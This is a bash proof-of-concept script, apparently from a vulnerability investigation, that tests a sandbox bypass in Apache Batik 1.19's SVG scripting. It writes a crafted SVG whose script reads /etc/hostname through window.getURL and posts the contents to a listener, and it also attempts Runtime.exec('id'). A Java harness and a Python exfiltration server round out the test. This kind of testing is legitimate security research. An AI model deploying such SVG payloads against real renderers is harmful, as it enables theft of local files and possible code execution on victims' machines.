#!/usr/bin/env bash
# HONEST F-3 re-test (answers the second-opinion contamination critique):
# Whitelist ONLY Batik's 249 default-import DOM classes (+ java.lang.System) — a realistically
# restricted scripting sandbox where the script CANNOT reach Runtime/exec/reflection.
# Then test: (a) does window.getURL still read a file + exfil? (b) is a direct Runtime.exec BLOCKED?
# If (a) works AND (b) blocked => getURL is a genuine resource-gate bypass, not an artifact of a full-RCE env.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")
# pull the default import class list from the batik-all jar
unzip -o -q "$W/batik-1.19/lib/batik-all-1.19.jar" 'META-INF/imports/script.txt' -d "$W/impchk" 2>/dev/null || true
IMPORTS=$(grep -E '^\s*class ' "$W/impchk/META-INF/imports/script.txt" 2>/dev/null | sed 's/#.*//' | awk '{print $2}')
COUNT=$(echo "$IMPORTS" | grep -c . )
echo "restricted whitelist classes: $COUNT (no Runtime/exec/reflection)"
printf '%s\n' "$IMPORTS" > "$W/wl.txt"

cat > f3r.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">
  <rect width="40" height="40" fill="blue"/>
  <script type="text/ecmascript"><![CDATA[
    function ex(t,c){ try{ window.postURL('http://127.0.0.1:9999/exfil-'+t, ''+c, function(){}); }catch(e){} }
    // (a) getURL resource-gate bypass — read local file, exfil
    window.getURL('file:///etc/hostname', function(r){ ex('geturl', r.content); });
    // (b) direct Java RCE attempt — must FAIL under the restricted whitelist
    try { var rt = java.lang.Runtime.getRuntime(); var p = rt.exec('id'); ex('runtime','RUNTIME_REACHED'); }
    catch(e){ ex('runtime','BLOCKED:'+e); }
  ]]></script>
</svg>
SVG

cat > F3R.java <<JAVA
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.swing.svg.SVGUserAgentAdapter;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument;
import java.io.*; import java.nio.file.*;
public class F3R {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    // RESTRICTED whitelist: only the default-import DOM classes (escaped), NOT .*
    for (String line : Files.readAllLines(Paths.get("/tmp/batik-lab/wl.txt"))) {
      String c = line.trim(); if (c.isEmpty()) continue;
      org.apache.batik.script.rhino.RhinoClassShutter.WHITELIST.add(java.util.regex.Pattern.quote(c));
    }
    String parser=XMLResourceDescriptor.getXMLParserClassName();
    SAXSVGDocumentFactory df=new SAXSVGDocumentFactory(parser);
    SVGDocument doc=df.createSVGDocument("http://127.0.0.1:8000/f3r.svg", new FileInputStream("/tmp/batik-lab/f3r.svg"));
    JSVGComponent comp=new JSVGComponent(new SVGUserAgentAdapter(), true, true);
    comp.setSize(40,40); comp.setSVGDocument(doc);
    Thread.sleep(9000); System.out.println("DONE");
  }
}
JAVA
javac -cp "$CP" F3R.java 2>&1 | head -3
cat > srv.py <<'PY'
import http.server, socketserver, threading, time
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get('Content-Length','0')); b=self.rfile.read(n)
        print("EXFIL %s = %r" % (self.path, b[:200]), flush=True)
        self.send_response(200); self.send_header('Content-Length','2'); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),H).serve_forever(),daemon=True).start()
time.sleep(14)
PY
python3 srv.py > /tmp/batik-lab/f3r.log 2>&1 & SRV=$!
sleep 1
timeout 40 java -cp "$CP:." F3R 2>&1 | grep -iE "DONE|importClass|error" | head -3
sleep 2
echo "=== RESULT ==="; cat /tmp/batik-lab/f3r.log
kill $SRV 2>/dev/null
